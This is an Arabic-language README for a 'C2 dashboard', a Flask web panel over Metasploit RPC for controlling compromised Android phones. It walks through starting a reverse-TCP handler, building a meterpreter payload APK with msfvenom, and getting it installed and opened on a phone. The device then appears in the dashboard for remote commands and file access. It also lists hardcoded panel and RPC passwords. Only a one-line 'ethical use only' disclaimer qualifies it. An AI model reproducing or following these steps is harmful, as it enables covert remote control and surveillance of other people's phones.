# 🔥 HAMZA SKU C2 Dashboard - المشروع الكامل

## 📁 الملفات:

```
complete_package/
├── server.py              # Backend كامل
└── templates/
    ├── login.html         # صفحة تسجيل الدخول
    ├── setup.html         # صفحة إعداد Handler
    ├── dashboard.html     # صفحة عرض الأجهزة
    └── session.html       # صفحة التحكم بالجهاز
```

---

## 🚀 التثبيت والتشغيل:

### 1. نسخ الملفات:
```bash
cd ~/
mkdir hamza_sku
cd hamza_sku

# انسخ جميع الملفات من complete_package إلى hamza_sku
```

### 2. تثبيت المكتبات:
```bash
pip3 install flask flask-socketio pymetasploit3
```

### 3. تشغيل Metasploit RPC:
```bash
# Terminal 1
msfrpcd -P msf_password -S -a 127.0.0.1

# يجب أن ترى:
# [*] MSGRPC Service:  127.0.0.1:55553
```

### 4. تشغيل Dashboard:
```bash
# Terminal 2
cd ~/hamza_sku
python3 server.py

# يجب أن ترى:
# [+] Connected to MSF
# * Running on http://0.0.0.0:5000
```

### 5. فتح المتصفح:
```
http://localhost:5000
```

---

## 🔑 تسجيل الدخول:

```
Password: hamza_sku_2026
```

---

## 📋 طريقة الاستخدام:

### 1. Setup Page:
- ادخل LHOST (IP الخاص بك)
- ادخل LPORT (مثلاً 443)
- اختر PAYLOAD (android/meterpreter/reverse_tcp)
- اضغط: **START HANDLER**

### 2. إنشاء Payload:
```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=YOUR_IP \
  LPORT=443 \
  -o payload.apk
```

### 3. تثبيت على الهاتف:
- انقل payload.apk للهاتف
- ثبّت التطبيق
- افتح التطبيق

### 4. Dashboard:
- اذهب لصفحة Dashboard
- سترى الجهاز يظهر تلقائياً
- اضغط على الجهاز لفتح صفحة التحكم

### 5. Session Control:
- استخدم الأزرار السريعة (System Info, List Files, etc)
- أو اكتب أوامر Meterpreter مباشرة في Terminal

---

## ⚠️ ملاحظات مهمة:

1. **msfrpcd يجب أن يعمل دائماً** قبل تشغيل Dashboard
2. كلمة مرور msfrpcd هي: `msf_password`
3. كلمة مرور Dashboard هي: `hamza_sku_2026`
4. للاستخدام الأخلاقي فقط!

---

## 🔧 استكشاف الأخطاء:

### المشكلة: "Failed to connect to Metasploit RPC"
```bash
# الحل:
pkill msfrpcd
msfrpcd -P msf_password -S -a 127.0.0.1
```

### المشكلة: كلمة المرور لا تعمل
```
# تأكد من:
Password: hamza_sku_2026
# بالضبط كما هي (بدون مسافات)
```

### المشكلة: لا تظهر Targets
```bash
# تحقق من:
1. Handler يعمل (في Setup page)
2. Payload متصل فعلاً
3. نفس الشبكة
```

---

## ✅ Checklist:

- [ ] msfrpcd يعمل
- [ ] server.py يعمل
- [ ] دخلت للموقع بنجاح
- [ ] Handler تم تشغيله
- [ ] Payload تم إنشاؤه
- [ ] Payload مثبت على الهاتف

---

**🔥 المشروع الكامل جاهز! 🔥**

*جميع الملفات متوافقة ومتكاملة*
